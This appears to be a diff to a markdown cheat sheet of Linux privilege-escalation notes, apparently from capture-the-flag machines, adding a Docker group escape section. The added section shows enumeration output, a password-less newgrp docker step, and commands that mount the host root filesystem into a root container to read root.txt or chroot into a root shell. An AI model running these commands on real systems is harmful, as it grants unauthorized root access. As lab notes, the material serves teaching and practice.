@@ -62,7 +62,7 @@ lxc start r00t
 
 ```
 Docker → Effectively root
-bashdocker run -v /root:/mnt -it ubuntu
+docker run -v /root:/mnt -it ubuntu
 
  id
 uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
@@ -179,4 +179,37 @@ sudo cat /etc/sudoers | grep "$(whoami)"
 # 5. Get root
 sudo /bin/bash
 
+```
+##Privilege Escalation — Docker Group Escape
+```
+Enumeration
+
+id
+# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+ 
+cat /etc/group | grep docker
+# docker:x:111:alice
+
+At first glance ben is not in the docker group. However, running newgrp docker does not prompt for a password, meaning ben's primary group is implicitly allowed into docker.
+
+newgrp docker
+id
+# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
+ 
+docker images
+# REPOSITORY                    TAG       IMAGE ID
+# mysql                         latest    f66b7a288113
+# privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731
+
+Docker Escape
+
+The privatebin/nginx-fpm-alpine image runs as nobody — use mysql instead which runs as root:
+
+docker run -v /:/mnt --rm mysql sh -c "cp /mnt/root/root.txt /mnt/tmp/flag.txt && chmod 777 /mnt/tmp/flag.txt"
+cat /tmp/flag.txt
+
+Or with a proper TTY:
+
+docker run -v /:/mnt --rm -it mysql chroot /mnt bash
+cat /root/root.txt
 ```
